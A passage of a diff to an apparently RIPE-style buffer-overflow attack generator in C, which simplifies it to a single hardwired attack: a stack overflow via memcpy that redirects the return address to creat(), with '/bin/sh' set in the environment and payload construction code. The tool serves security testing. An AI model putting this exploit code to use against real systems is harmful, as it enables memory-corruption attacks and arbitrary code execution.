@@ -90,7 +90,6 @@ static struct attackme data_struct = {"AAAAAAAAAAAA",&fooz};
 //NN: Moved away of harm's way (aka overflowing buffers in the data segment)
 static char loose_change1[128];      //NN Sandwich the control vars
 static boolean output_error_msg = TRUE;
-static boolean has_opened_output_stream = FALSE;
 static ATTACK_FORM attack;
 static char loose_change2[128];      //NN Sandwich the control vars
 
@@ -128,29 +127,13 @@ int main(int argc, char **argv) {
   }
 
 // ./build/ripe_attack_generator -t direct -i returnintolibc -c ret  -l stack -f memcpy
-  attack.technique = DIRECT;
-  attack.inject_param = RETURN_INTO_LIBC;
-  attack.code_ptr = RET_ADDR;
-  attack.location = STACK;
-  attack.function = MEMCPY;
 
   setenv("param_to_system", "/bin/sh", 1);
   setenv("param_to_creat", "/tmp/rip-eval/f_xxxx",1); //NN
 
   /* Check if attack form is possible */
-  if(is_attack_possible()) {
-    //NN
-    perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
-  } else {
-    exit(ATTACK_IMPOSSIBLE);
-  }
-
-
-  if(has_opened_output_stream) {
-    fclose(output_stream);
-  }
+  perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
 }
-
 
 //Data Segment Attack vectors where here
 //but they were moved to the top of the file
@@ -191,8 +174,6 @@ void perform_attack(FILE *output_stream,
   jmp_buf stack_jmp_buffer_indirect[512];
   struct attackme stack_struct;
   stack_struct.func_ptr = fooz;
-
- 
 
   /* HEAP TARGETS */
   /* Heap buffers to inject into                                            */
@@ -238,10 +219,6 @@ void perform_attack(FILE *output_stream,
   static jmp_buf bss_jmp_buffer_indirect;
 
   static struct attackme bss_struct;
-  
-
-
-
 
   /* Pointer to buffer to overflow */
   char *buffer, *dump_start_addr;
@@ -273,115 +250,26 @@ void perform_attack(FILE *output_stream,
   /***************************************/
   /* Set location for buffer to overflow */
   /***************************************/
-  switch(attack.location) {
-  case STACK:
-    /* Injection into stack buffer                           */
-    /* Make sure that we start injecting the shellcode on an */
-    /* address not containing any terminating characters     */
+  /* Injection into stack buffer                           */
+  /* Make sure that we start injecting the shellcode on an */
+  /* address not containing any terminating characters     */
 
-    //NN: Special case for stack_struct 
-    if(attack.code_ptr == STRUCT_FUNC_PTR_STACK){
-      buffer = stack_struct.buffer;
-      break;
-    }
-
-    /* NN: Trying addresses until correct */
-    buffer = stack_buffer;
-    while (contains_terminating_char((unsigned long)buffer)){
-      buffer += rand() % 10;
-      printf("Trying %p\n",buffer);
-    }
-    /* Out of Bounds */
-    if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
-      printf("Error. Couldn't find appropriate buffer on the stack\n");
-      exit(1);
-    }
-
-    // Also set the location of the function pointer and the
-    // longjmp buffer on the heap (the same since only choose one)
-    heap_func_ptr = (void *)heap_buffer1;
-    heap_jmp_buffer = (void *)heap_buffer1;
-    break;
-  case HEAP:
-    /* Injection into heap buffer                            */
-
-    //NN: Special case for heap_struct 
-    if(attack.code_ptr == STRUCT_FUNC_PTR_HEAP){
-      buffer = heap_struct->buffer;
-      break;
-    }
-
-
-    if(((unsigned long)heap_buffer1 < (unsigned long)heap_buffer2) &&
-       ((unsigned long)heap_buffer2 < (unsigned long)heap_buffer3)) {
-      buffer = heap_buffer1;
-      // Set the location of the memory pointer on the heap
-      heap_mem_ptr = (long *)heap_buffer2;
-      // Also set the location of the function pointer and the
-      // longjmp buffer on the heap (the same since only choose one)
-      heap_func_ptr = (void *)heap_buffer3;
-      //      heap_jmp_buffer = (int *)heap_buffer3;    //NN heap_jmp_buffer still doesn't point anywhere
-      heap_jmp_buffer = (int *)malloc(sizeof(jmp_buf)); //NN Now it does...hopefully in the correct order
-    } else {
-      if(output_error_msg) {
-        printf("Error: Heap buffers allocated in the wrong order.\n");
-      }
-      exit(1);
-    }
-    break;
-  case BSS:
-    /* Injection into BSS buffer                             */
-    /* Make sure that we start injecting the shellcode on an */
-    /* address not containing any terminating characters     */
-    /* @todo ensure that the chosen address truly is correct */
- 
-   //NN: Special case for bss_struct 
-    if(attack.code_ptr == STRUCT_FUNC_PTR_BSS){
-      buffer = bss_struct.buffer;
-      break;
-    }
-
-    if(contains_terminating_char((unsigned long)&bss_buffer1)) {
-      buffer = bss_buffer2;
-    } else {
-    /* @todo Currently just assumes the next address is OK   */
-      buffer = bss_buffer1;
-    }
-    // Also set the location of the function pointer and the
-    // longjmp buffer on the heap (the same since only choose one)
-    heap_func_ptr = (void *)heap_buffer1;
-    heap_jmp_buffer = (int *)heap_buffer1;
-    break;
-  case DATA:
-    /* Injection into data segment buffer                    */
-    /* Make sure that we start injecting the shellcode on an */
-    /* address not containing any terminating characters     */
-    /* @todo ensure that the chosen address truly is correct */
-
-    //NN: Special case for stack_struct 
-    if(attack.code_ptr == STRUCT_FUNC_PTR_DATA){
-      buffer = data_struct.buffer;
-      break;
-    }
-
-    if(contains_terminating_char((unsigned long)&data_buffer1)) {
-      buffer = data_buffer2;
-    } else {
-    /* @todo Currently just assumes the next address is OK   */
-      buffer = data_buffer1;
-    }
-    // Also set the location of the function pointer and the
-    // longjmp buffer on the heap (the same since only choose one)
-    heap_func_ptr = (void *)heap_buffer1;
-    heap_jmp_buffer = heap_buffer1;
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of location\n");
-    }
-    exit(1);
-    break;
+  /* NN: Trying addresses until correct */
+  buffer = stack_buffer;
+  while (contains_terminating_char((unsigned long)buffer)){
+    buffer += rand() % 10;
+    printf("Trying %p\n",buffer);
   }
+  /* Out of Bounds */
+  if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
+    printf("Error. Couldn't find appropriate buffer on the stack\n");
+    exit(1);
+  }
+
+  // Also set the location of the function pointer and the
+  // longjmp buffer on the heap (the same since only choose one)
+  heap_func_ptr = (void *)heap_buffer1;
+  heap_jmp_buffer = (void *)heap_buffer1;
 
   //make sure we actually have an initialized function pointer on the heap
   if (heap_func_ptr)
@@ -391,129 +279,7 @@ void perform_attack(FILE *output_stream,
   /* Set target address for overflow, */
   /* (used to calculate payload size) */
   /************************************/
-  switch(attack.technique) {
-  case DIRECT:
-    switch(attack.code_ptr) {
-    case RET_ADDR:
-      target_addr = RET_ADDR_PTR;
-      break;
-    case OLD_BASE_PTR:
-      target_addr = OLD_BP_PTR;
-      break;
-    case FUNC_PTR_STACK_VAR:
-      target_addr = &stack_func_ptr;
-      break;
-    case FUNC_PTR_STACK_PARAM:
-      target_addr = &stack_func_ptr_param;
-      break;
-    case FUNC_PTR_HEAP:
-      target_addr = heap_func_ptr;
-      break;
-    case FUNC_PTR_BSS:
-      target_addr = &bss_func_ptr;
-      break;
-    case FUNC_PTR_DATA:
-      target_addr = &data_func_ptr1;
-      break;
-    case LONGJMP_BUF_STACK_VAR:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      target_addr = &stack_jmp_buffer[0].__jmpbuf[5];
-#endif
-      break;
-    case LONGJMP_BUF_STACK_PARAM:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      target_addr = &stack_jmp_buffer_param[0].__jmpbuf[5];
-#endif
-      break;
-    case LONGJMP_BUF_HEAP:
-      //target_addr = &heap_jmp_buffer[0].__jmpbuf[5];
-      printf("heap_jmp_buffer @%p\n",heap_jmp_buffer);
-      target_addr = (void *)heap_jmp_buffer + 20; //NN now it should point to the correct entry of the
-          //jmp_buf structure
-      break;
-    case LONGJMP_BUF_BSS:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      target_addr = &bss_jmp_buffer[0].__jmpbuf[5];
-#endif
-      break;
-    case LONGJMP_BUF_DATA:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      target_addr = &data_jmp_buffer[0].__jmpbuf[5];
-#endif
-      break;
-    case STRUCT_FUNC_PTR_STACK:
-      target_addr = &stack_struct.func_ptr;
-      break;
-    case STRUCT_FUNC_PTR_HEAP:
-      target_addr = (void *)heap_struct + 256; 
-      break;
-    case STRUCT_FUNC_PTR_DATA:
-      target_addr = &data_struct.func_ptr;
-      break;
-    case STRUCT_FUNC_PTR_BSS:
-      target_addr = &bss_struct.func_ptr;
-      break;
-
-    default:
-      if(output_error_msg) {
-  printf("Error: Unknown choice of code pointer\n");
-      }
-      exit(1);
-      break;
-    }
-    break;
-  case INDIRECT:
-    switch(attack.location) {
-    case STACK:
-      target_addr = &stack_mem_ptr;
-      break;
-    case HEAP:
-      target_addr = heap_mem_ptr;
-      break;
-    case BSS:
-      target_addr = &bss_mem_ptr;
-      bss_mem_ptr = &bss_dummy_value;
-      break;
-    case DATA:
-      target_addr = &data_mem_ptr;
-      printf("Indirect attack, DATA SEGMENT target addr\n");
-      break;
-    default:
-      if(output_error_msg) {
-  printf("Error: Unknown choice of pointer\n");
-      }
-      exit(1);
-      break;
-    }
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of technique\n");
-    }
-    exit(1);
-    break;
-  }
-
+  target_addr = RET_ADDR_PTR;
 
   /*********************/
   /* Configure payload */
@@ -521,203 +287,9 @@ void perform_attack(FILE *output_stream,
 
   payload.ptr_to_correct_return_addr = RET_ADDR_PTR;
 
-  // Set longjmp buffers
-  switch(attack.code_ptr) {
-  case LONGJMP_BUF_STACK_VAR:
-    if(setjmp(stack_jmp_buffer) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-    payload.jmp_buffer = &stack_jmp_buffer;
-    break;
-  case LONGJMP_BUF_STACK_PARAM:
-    if(setjmp(stack_jmp_buffer_param) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-    payload.jmp_buffer = (void *)stack_jmp_buffer_param;
-    payload.stack_jmp_buffer_param = &stack_jmp_buffer_param;
-    break;
-  case LONGJMP_BUF_HEAP:
-    if(setjmp(*heap_jmp_buffer) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-    
-    payload.jmp_buffer = (void *)heap_jmp_buffer;
-    payload.stack_jmp_buffer_param = NULL;
-    break;
-  case LONGJMP_BUF_BSS:
-    if(setjmp(bss_jmp_buffer) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-    printf("bss_jmp_buffer is set\n");
-    payload.jmp_buffer = (void *)bss_jmp_buffer;
-    payload.stack_jmp_buffer_param = NULL;
-   //NN added second setjmp to populate indirect_jmp_buffer
-   if(setjmp(bss_jmp_buffer_indirect) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-    break;
-  case LONGJMP_BUF_DATA:
-    if(setjmp(data_jmp_buffer) != 0) {
-    /* setjmp() returns 0 if returning directly and non-zero when returning */
-    /* from longjmp() using the saved context. Attack failed.               */
-      return;
-    }
-
-    payload.jmp_buffer = (void *)data_jmp_buffer;
-    payload.stack_jmp_buffer_param = NULL;
-    break;
-  default:
-    // Not an attack against a longjmp buffer
-    break;
-  }
-
-  payload.inject_param = attack.inject_param;
-
-  switch(attack.technique) {
-  case DIRECT:
-    /* Here payload.overflow_ptr will point to the attack code since */
-    /* a direct attack overflows the pointer target directly         */
-    switch(attack.inject_param) {
-    case INJECTED_CODE_NO_NOP:
-    case INJECTED_CODE_SIMPLE_NOP:
-    case INJECTED_CODE_POLY_NOP:
-    case CREATE_FILE:
-      payload.overflow_ptr = buffer;
-      break;
-    case RETURN_INTO_LIBC:
-      if(attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
-         attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
-         attack.code_ptr == LONGJMP_BUF_HEAP ||
-         attack.code_ptr == LONGJMP_BUF_BSS ||
-         attack.code_ptr == LONGJMP_BUF_DATA) {
-        //NN: We fixed this piece of code to actually call
-        //a usefull system call. We now re-write the esp pointer
-        //inside the jmpbuf structure along with the eip to provide
-        //the correct arguments to creat
-        payload.overflow_ptr = &creat; //NN
-      } else {
-        payload.overflow_ptr = &creat; //NN42 
-      }
-      break;
-
-    case RETURN_ORIENTED_PROGRAMMING:
-      payload.overflow_ptr = rop_sled;
-      break;
-
-    default:
-      if(output_error_msg) {
-        printf("Error: Unknown choice of attack parameterA\n");
-      }
-      exit(1);
-      break;
-    }
-    break;
-  case INDIRECT:
-    /* Here payload.overflow_ptr will point to the final pointer target   */
-    /* since an indirect attack first overflows a general pointer that in */
-    /* turn is dereferenced to overwrite the target pointer               */
-    switch(attack.code_ptr) {
-    case RET_ADDR:
-      payload.overflow_ptr = RET_ADDR_PTR;
-      break;
-    case OLD_BASE_PTR:
-      payload.overflow_ptr = OLD_BP_PTR;
-      //NN:Change this when we change the return into libc from system to creat
-      if(attack.inject_param == RETURN_INTO_LIBC) {
-        payload.fake_return_addr = &creat; //NN42
-      } else {
-        payload.fake_return_addr = (long *)buffer;
-      }
-      break;
-    case FUNC_PTR_STACK_VAR:
-      payload.overflow_ptr = &stack_func_ptr;
-      break;
-    case FUNC_PTR_STACK_PARAM:
-      payload.overflow_ptr = &stack_func_ptr_param;
-      break;
-    case FUNC_PTR_HEAP:
-      payload.overflow_ptr = heap_func_ptr;
-      break;
-    case FUNC_PTR_BSS:
-      payload.overflow_ptr = &bss_func_ptr;
-      break;
-    case FUNC_PTR_DATA:
-  //NN ofcourse we are not sure if the else is correct...we will see
-      if (contains_terminating_char(&data_func_ptr1))
-        payload.overflow_ptr = &data_func_ptr2;
-      else
-        payload.overflow_ptr = &data_func_ptr1;
-      break;
-    case LONGJMP_BUF_STACK_VAR:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      payload.overflow_ptr = &stack_jmp_buffer[0].__jmpbuf[5];
-#endif
-      break;
-    case LONGJMP_BUF_STACK_PARAM:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      payload.overflow_ptr = &stack_jmp_buffer_param[0].__jmpbuf[5];
-#endif
-      break;
-    case LONGJMP_BUF_HEAP:
-      //payload.overflow_ptr = &heap_jmp_buffer[0].__jmpbuf[5];
-      payload.overflow_ptr = (void *)heap_jmp_buffer + 20; // NN
-      break;
-    case LONGJMP_BUF_BSS:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      //payload.overflow_ptr = &bss_jmp_buffer[0].__jmpbuf[5];
-      payload.overflow_ptr = &bss_jmp_buffer_indirect[0].__jmpbuf[5]; //NN
-#endif
-      break;
-    case LONGJMP_BUF_DATA:
-#ifdef __APPLE__
-      if(output_error_msg) {
-        printf("Error: Unsupported case on macOS\n");
-      }
-      exit(1);
-#else
-      payload.overflow_ptr = &data_jmp_buffer[0].__jmpbuf[5];
-#endif
-      break;
-    default:
-      if(output_error_msg) {
-        printf("Error: Unknown choice of code pointer\n");
-      }
-      exit(1);
-      break;
-    }
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of technique\n");
-    }
-    exit(1);
-    break;
-  }
+  /* Here payload.overflow_ptr will point to the attack code since */
+  /* a direct attack overflows the pointer target directly         */
+  payload.overflow_ptr = &creat; //NN42 
 
   /* Calculate payload size for overflow of chosen target address */
   if ((unsigned long)target_addr > (unsigned long)buffer) {
@@ -730,7 +302,6 @@ void perform_attack(FILE *output_stream,
      printf("buffer == %p\n", buffer);
      printf("psize == %d\n",payload.size);
      printf("stack_buffer == %p\n", stack_buffer);
-
 
   } else {
     if(output_error_msg) {
@@ -760,268 +331,12 @@ void perform_attack(FILE *output_stream,
     exit(1);
   }
 
-  /* Special case: Attacks on old base pointer */
-  if(attack.technique == DIRECT &&
-     attack.code_ptr == OLD_BASE_PTR) {
-
-    /* Configure so that old base pointer will be overwritten to     */
-    /* point to the copied base pointer in the injected fake stack   */
-    /* frame. This needs to be done here since only now do we know   */
-    /* on which address the copied base pointer ends up. The offset  */
-    /* has been set on the build_payload() function.                 */
-
-    // First - point to the copied base pointer
-    stack_mem_ptr = (long *)(buffer +        // start
-           payload.size -  // end
-           1 -             // null terminator
-           sizeof(long) -  // copied correct ret
-           sizeof(long) -  // injected new base ptr
-           payload.offset_to_fake_return_addr -
-           sizeof(long));  // the copied base ptr
-
-    // Make indirect reference so that overwritten base ptr points
-    // to the copied base ptr futher up the stack
-    payload.overflow_ptr = &stack_mem_ptr;
-
-    // Copy pointer to copied base pointer
-    memcpy(&payload.buffer[payload.size -    // start
-         1 -               // null terminator
-         sizeof(long) -    // copied correct ret
-         sizeof(long)],    // injected new base ptr
-     payload.overflow_ptr,
-     sizeof(long));
-  }
-
   /****************************************/
   /* Overflow buffer with chosen function */
   /* Note: Here memory will be corrupted  */
   /****************************************/
-  switch(attack.function) {
-  case MEMCPY:
-    // memcpy() shouldn't copy the terminating NULL, therefore - 1
-    memcpy(buffer, payload.buffer, payload.size - 1);
-    break;
-  case STRCPY:
-    strcpy(buffer, payload.buffer);
-    break;
-  case STRNCPY:
-    strncpy(buffer, payload.buffer, payload.size);
-    break;
-  case SPRINTF:
-    sprintf(buffer, "%s", payload.buffer);
-    break;
-  case SNPRINTF:
-    snprintf(buffer, payload.size, "%s", payload.buffer);
-    break;
-  case STRCAT:
-    strcat(buffer, payload.buffer);
-    break;
-  case STRNCAT:
-    strncat(buffer, payload.buffer, payload.size);
-    break;
-  case SSCANF:
-    snprintf(format_string_buf, 15, "%%%ic", payload.size);
-    sscanf(payload.buffer, format_string_buf, buffer);
-    break;
-  case FSCANF:
-    snprintf(format_string_buf, 15, "%%%ic", payload.size);
-    fscanf_temp_file = fopen("./fscanf_temp_file", "w+");
-    fprintf(fscanf_temp_file, "%s", payload.buffer);
-    rewind(fscanf_temp_file);
-    fscanf(fscanf_temp_file, format_string_buf, buffer);
-
-    /**  Fclose will try to do pointer arithmetic with ebp which is now broken and thus will crash
-     *   instead of returning... when this function returns, then the shellcode is triggered correctly 
-     
-     *fclose(fscanf_temp_file);
-     *unlink("./fscanf_temp_file");
-    **/
-    break;
-  case HOMEBREW:
-    homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of function\n");
-    }
-    exit(1);
-    break;
-  }
-
-
-  /*******************************************/
-  /* Ensure that code pointer is overwritten */
-  /*******************************************/
-
-  switch(attack.technique) {
-  case DIRECT:
-    /* Code pointer already overwritten */
-    break;
-  case INDIRECT:
-    switch(attack.inject_param) {
-    case INJECTED_CODE_NO_NOP:
-    case INJECTED_CODE_SIMPLE_NOP:
-    case INJECTED_CODE_POLY_NOP:
-    case CREATE_FILE:
-
-      if(attack.code_ptr == OLD_BASE_PTR) {
-  // Point to the old base pointer of the fake stack frame
-  *(long *)(*(long *)target_addr) = 
-    (long)(buffer +        // start
-     payload.size -  // end
-     1 -             // null terminator
-     sizeof(long) -  // injected new base ptr
-     payload.offset_to_fake_return_addr -
-     sizeof(long));  // the copied base ptr
-
-      } else {
-  // Point to the attack code
-  *(long *)(*(long *)target_addr) = (long)buffer;
-      }
-      break;
-    case RETURN_INTO_LIBC:
-      if(attack.code_ptr == RET_ADDR ||
-   attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
-   attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
-   attack.code_ptr == LONGJMP_BUF_HEAP ||
-   attack.code_ptr == LONGJMP_BUF_BSS ||
-   attack.code_ptr == LONGJMP_BUF_DATA) {
-  /* Note: These attack forms are considered impossible           */
-  /* When overflowing the return address or the code pointer in a */
-  /* longjmp buffer it's complicated to pass on parameters to the */
-  /* libc function, but sleep() accepts most params               */
-  //*(long *)(*(long *)target_addr) = (long)&sleep;
-  *(long *)(*(long *)target_addr) = (long)&creat; //NN
-      } else if(attack.code_ptr == OLD_BASE_PTR) {
-  // First - point to the copied base pointer
-  *(long *)(*(long *)target_addr) =
-    (long *)(buffer +        // start
-       payload.size -  // end
-       1 -             // null terminator
-       sizeof(long) -  // injected memory pointer
-       payload.offset_to_fake_return_addr -
-       sizeof(long));  // the new old base ptr
-  printf("*(long *)(*(long *)target_addr) = %p\n",
-           *(long *)(*(long *)target_addr));
-  printf("*(long *)(*(long *)(*(long *)target_addr)) = %p\n",
-           *(long *)(*(long *)(*(long *)target_addr)));
-  printf("*(long *)(*(long *)(*(long *)target_addr) + 4) = %p\n",
-           *(long *)(*(long *)(*(long *)target_addr) + 4));
-  printf("*(long *)(*(long *)(*(long *)target_addr) + 8) = %p\n",
-           *(long *)(*(long *)(*(long *)target_addr) + 8));
-  printf("*(long *)(*(long *)(*(long *)target_addr) + 12) = %p\n",
-           *(long *)(*(long *)(*(long *)target_addr) + 12));
-  printf("*(long *)(*(long *)(*(long *)target_addr) + 16) = %p\n",
-           *(long *)(*(long *)(*(long *)target_addr) + 16));
-
-  printf("Value written to target_addr = %p\n",
-    (long *)(buffer +        // start
-       payload.size -  // end
-       1 -             // null terminator
-       sizeof(long) -  // injected memory pointer
-       payload.offset_to_fake_return_addr -
-       sizeof(long))  // the new old base ptr
-         );
-      } else {
-  /* Note: These attack forms are considered impossible           */
-  *(long *)(*(long *)target_addr) = (long)&system;
-      }
-      break;
-    default:
-      if(output_error_msg) {
-  printf("Error: Unknown choice of attack parameterB\n");
-      }
-      exit(1);
-      break;
-    }
-    /* @todo Write payload.overflow_ptr to overwritten pointer */
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of technique\n");
-    }
-    exit(1);
-    break;
-  }    
-
-
-  /*************************************************************/
-  /* Ensure that program jumps to the overwritten code pointer */
-  /* Send "/bin/sh" as parameter since it might be a return-   */
-  /* into-libc attack calling system()                         */
-  /*************************************************************/
-  // Only do this if not in debug mode since
-  // an attack effectively destroys the memory
-  // structures needed to inspect functionality
-  switch(attack.code_ptr) {
-    case RET_ADDR:
-    case OLD_BASE_PTR:
-      /* Just let the function carry on and eventually return */
-      break;
-    case FUNC_PTR_STACK_VAR:
-      ((int (*)(char *,int)) (*stack_func_ptr)) ("/tmp/rip-eval/f_xxxx",700);
-      break;
-
-    case FUNC_PTR_STACK_PARAM:
-      ((int (*)(char *,int)) (*stack_func_ptr_param))("/tmp/rip-eval/f_xxxx",700);
-      break;
-
-    case FUNC_PTR_HEAP:
-      // Get the function pointer stored in the overflown heap buffer
-      ((int (*)(char *,int))*heap_func_ptr)("/tmp/rip-eval/f_xxxx",700);
-      break;
-
-    case FUNC_PTR_BSS:
-      ((int (*)(char *,int)) (*bss_func_ptr))("/tmp/rip-eval/f_xxxx",700);
-      break;
-
-    case FUNC_PTR_DATA:
-      //NN
-      if (contains_terminating_char(&data_func_ptr1))
-        ((int (*)(char *,int)) (*data_func_ptr2))("/tmp/rip-eval/f_xxxx",700);
-      else
-        ((int (*)(char *,int)) (*data_func_ptr1))("/tmp/rip-eval/f_xxxx",700);  
-      break;
-    case LONGJMP_BUF_STACK_VAR:
-      longjmp(stack_jmp_buffer, 1);
-      break;
-    case LONGJMP_BUF_STACK_PARAM:
-      longjmp(stack_jmp_buffer_param, 1);
-      break;
-    case LONGJMP_BUF_HEAP:
-      longjmp(*heap_jmp_buffer, 1);
-      break;
-    case LONGJMP_BUF_BSS:
-      /* NN: Indirect jmping needs to be treated differently */
-      if(attack.technique == DIRECT)
-        longjmp(bss_jmp_buffer, 1);
-      else if (attack.technique == INDIRECT)
-        longjmp(bss_jmp_buffer_indirect, 1);
-      break;
-    case LONGJMP_BUF_DATA:
-      longjmp(data_jmp_buffer, 1);
-      break;
-
-    case STRUCT_FUNC_PTR_STACK:
-      (*stack_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-      break;
-    case STRUCT_FUNC_PTR_HEAP:
-      (*heap_struct->func_ptr)("/tmp/rip-eval/f_xxxx",700);
-      break;
-    case STRUCT_FUNC_PTR_DATA:
-      (*data_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-      break;
-    case STRUCT_FUNC_PTR_BSS:
-      (*bss_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-      break;
-
-    default:
-      if(output_error_msg) {
-        printf("Error: Unknown choice of code pointer\n");
-      }
-      exit(1);
-      break;
-  }
+  // memcpy() shouldn't copy the terminating NULL, therefore - 1
+  memcpy(buffer, payload.buffer, payload.size - 1);
 }
 
 
@@ -1032,61 +347,14 @@ boolean build_payload(CHARPAYLOAD *payload) {
   size_t size_shellcode, bytes_to_pad, i;
   char *shellcode, *temp_char_buffer, *temp_char_ptr;
 
-  switch(attack.inject_param) {
-  case INJECTED_CODE_NO_NOP:
-    if(payload->size < (size_shellcode_nonop + sizeof(long))) {
-      return FALSE;
-    }
-    size_shellcode = size_shellcode_nonop;
-    shellcode = shellcode_nonop;
-    break;
-  case INJECTED_CODE_SIMPLE_NOP:
-    if(payload->size < (size_shellcode_simplenop + sizeof(long))) {
-      printf("Payload size problem..............................\n");
-      return FALSE;
-    }
-    size_shellcode = size_shellcode_simplenop;
-    shellcode = shellcode_simplenop;
-    break;
-  case INJECTED_CODE_POLY_NOP:
-    if(payload->size < (size_shellcode_polynop + sizeof(long))) {
-      return FALSE;
-    }
-    size_shellcode = size_shellcode_polynop;
-    shellcode = shellcode_polynop;
-    break;
-  case CREATE_FILE:
-    if(payload->size < (size_shellcode_createfile + sizeof(long))) {
-      return FALSE;
-    }
-    size_shellcode = size_shellcode_createfile;
-    shellcode = createfile_shellcode;
-    break;
-  case RETURN_INTO_LIBC:
-    if(payload->size < sizeof(long)) {
-      return FALSE;
-    }
-    size_shellcode = 0;
-    shellcode = "dummy";
-    break;
-
-  //NN42: Experimental
-  case RETURN_ORIENTED_PROGRAMMING: 
-    size_shellcode = 0;
-    shellcode = "dummy";
-    break;
-
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of attack parameter");
-    }
-    exit(1);
-    break;
+  if(payload->size < sizeof(long)) {
+    return FALSE;
   }
+  size_shellcode = 0;
+  shellcode = "dummy";
  
   //at this point, shellcode points to the correct shellcode and shellcode size points
   //to the correct size
-  
 
   /* Allocate payload buffer */
 
@@ -1109,257 +377,50 @@ boolean build_payload(CHARPAYLOAD *payload) {
   //NN
   printf("\noverflow_ptr: %p\n",payload->overflow_ptr);
 
-
-  /* *************************************** */
-  /* Special case: Build fake longjmp buffer */
-  /* *************************************** */
-  if(attack.technique == DIRECT &&
-     (attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
-      attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
-      attack.code_ptr == LONGJMP_BUF_HEAP ||
-      attack.code_ptr == LONGJMP_BUF_BSS ||
-      attack.code_ptr == LONGJMP_BUF_DATA)) {
-
-    /* If we're aiming for a direct longjmp buffer attack we need to copy BX */
-    /* SI, DI, BP, and SP from jmp_buffer to build a complete longjmp buffer */
-    memcpy(&(payload->buffer[size_shellcode +
-           bytes_to_pad -
-           (5*sizeof(long))]),
-     payload->jmp_buffer,
-     5 * sizeof(long));
-
-
-    // For attacks against a stack parameter we need to
-    // copy the pointer to the parameter
-    if(attack.code_ptr == LONGJMP_BUF_STACK_PARAM) {
-      // Array parameters are passed on as pointers so we need to
-      // include the correct pointer to the actual longjmp buffer
-      // in the right place on the stack below the return address
-      size_t offset_to_stack_jmp_buffer_param =
-  ((unsigned long)payload->jmp_buffer) -
-  ((unsigned long)payload->stack_jmp_buffer_param);
-      
-      // Copy the pointer to the longjmp buffer parameter
-      // to the right place in the payload buffer
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             (5*sizeof(long)) -
-             offset_to_stack_jmp_buffer_param]),
-       payload->stack_jmp_buffer_param,
-       sizeof(long));
-    }
-
-   //NN: Trying to make an actual system systemcall instead of sleep
-    //NN: Overwriting the saved esp
-    if(attack.inject_param == RETURN_INTO_LIBC){
-  void *pr = fake_esp_jmpbuff + 12;
-  memcpy(&(payload->buffer[size_shellcode + bytes_to_pad - 1*sizeof(long)]),&pr,sizeof(long));
-  printf("Changed esp register in payload\n");
-    }
-
-  }
-
   /* ************************************ */
   /* Special case: Build fake stack frame */
   /* ************************************ */
-  if(attack.code_ptr == OLD_BASE_PTR) {
 
-    // Set an offset for where in the payload padding
-    // area to inject a fake stack frame with a
-    // copied base pointer and a return address
-    // pointing to attack code
-    payload->offset_to_fake_return_addr = (8 * sizeof(long));
+  /* Extend the payload to cover two memory addresses beyond the  */
+  /* return address and inject a pointer to environment variable  */
+  /* containing a "/bin/sh" parameter for return-into-libc attacks*/
 
-    if(attack.technique == DIRECT) {
-      /* Insert fake return address after the fake old base pointer */
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr]),
-       &payload->overflow_ptr,
-       sizeof(long));
-
-      /* Insert pointer to environment variable containing a          */
-      /* "/bin/sh" parameter for return-into-libc attacks             */
-      //NN42 Changed to creat
-      temp_char_ptr = getenv("param_to_creat");
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr +
-             2*sizeof(long)]),
-       &temp_char_ptr,
-       sizeof(long));  
-
-      //NN42 Adding permissions
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr +
-             3*sizeof(long)]),
-       &fake_esp_jmpbuff[14],
